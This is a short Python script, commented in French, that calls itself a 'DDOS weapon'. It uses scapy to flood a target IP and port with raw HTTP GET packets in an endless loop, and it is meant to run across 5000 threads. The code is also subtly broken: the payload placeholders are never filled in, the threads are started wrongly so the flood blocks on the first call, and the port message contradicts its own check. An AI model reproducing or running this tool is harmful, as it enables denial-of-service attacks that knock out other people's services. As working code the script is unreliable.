import argparse
import socket,threading
import sys
from scapy.all import *


def http_flood(target,dst_port):

    payload = "GET /http://{target} HTTP/1.1\nHost: {ip_addr}\n\n" #Requête
    pkt = IP(dst=target) / TCP(dport=int(dst_port)) / Raw(payload)

    while True:

        send(pkt, inter = .001) #Envoi des paquets

def main():

    parser = argparse.ArgumentParser(prog="ddos",description="DDOS weapon")
    parser.add_argument('-t','--target',help="target IP",required=True) #target = ip de la cible
    parser.add_argument('-p','--port',help="target Port",required=True) #port = port de la cible
    args = parser.parse_args()
    ip = args.target
    port = args.port

    #Vérifie que le port existe
    if ((int(port)>65535) or (int(port)<1)):
        print('Port number must be find between 0 and 65535')
        exit()

    ip_addr = socket.gethostbyname(socket.gethostname())
    num_threads = 5000 #Nombre de threads à utiliser

    threads = [] #Liste pour stocker les threads

    #Création et démarrage des threads
    for _ in range(num_threads):
        thread = threading.Thread(http_flood(ip,port))
        thread.start()
        threads.append(thread)

    #Attente de la fin de tous les threads
    for thread in threads:
        thread.join()



if __name__ == "__main__":
    main()
